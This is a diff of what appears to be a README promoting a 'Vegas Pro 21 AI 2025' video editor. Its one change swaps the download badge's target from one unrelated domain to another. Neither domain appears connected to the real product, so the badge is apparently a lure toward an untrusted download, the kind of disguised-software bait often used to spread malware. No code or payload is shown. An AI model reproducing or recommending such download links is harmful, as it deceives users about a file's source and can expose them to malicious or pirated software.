@@ -2,7 +2,7 @@
 
 ⚡️ Craft epic videos with this AI-charged editor! Vegas Pro 21 AI 2025 brings Z-Depth, Smart Mask, Voiceovers, and more to filmmakers, streamers, and content creators.
 
-[![Download Vegas Pro 21 AI](https://img.shields.io/badge/Download-Vegas_Pro_21_AI-blueviolet)](https://cea-groupe.com)
+[![Download Vegas Pro 21 AI](https://img.shields.io/badge/Download-Vegas_Pro_21_AI-blueviolet)](https://glocktober.com)
 
 ---
 
